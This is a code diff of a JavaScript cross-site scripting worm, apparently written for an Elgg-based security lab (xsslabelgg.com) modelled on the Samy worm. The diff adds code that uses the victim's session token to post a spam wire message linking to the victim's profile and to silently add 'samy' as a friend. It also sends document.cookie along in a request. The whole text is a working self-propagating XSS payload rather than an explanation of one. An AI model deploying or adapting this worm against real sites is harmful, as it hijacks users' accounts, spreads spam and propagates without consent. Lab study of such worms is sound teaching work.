@@ -22,7 +22,13 @@ var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
     var brief = '&briefdescription=' + 'hacking done';
     var idd = '&guid=' + elgg.session.user.guid;
 
+
     var data = ts + token + name + description + brief + idd;
+
+
+
+    // posting on wire ************************************************************
+
     var name2 = elgg.session.user.username;
     var postdata = 'To earn 12 USD/Hour(!), visit now \n';
     var linkk = 'http://www.xsslabelgg.com/profile/'+name2;
@@ -33,6 +39,13 @@ var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
     
     data2.append('body', postdata+linkk);
     //"__elgg_token="+elgg.security.token.__elgg_token + ts + '&body=' + postdata + linkk;
+
+    // adding samy as friend ****************************************************
+
+    var url3 = "http://www.xsslabelgg.com/action/friends/add?friend=47";
+    //var userid3 = elgg.page_owner.guid;
+    var sendurl3 = url3 + ts + token + ts + token; //FILL IN
+
 
     if(elgg.session.user.guid != elgg.page_owner.guid)
     {
@@ -51,6 +64,10 @@ var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
 	    Ajax2.open("POST",sendurl2,true);
 	    Ajax2.setRequestHeader("Cookie",document.cookie);
 	    Ajax2.send(data2);
+
+
+	    Ajax.open("GET",sendurl3,true);
+	    Ajax.send();	
 	}
 
 
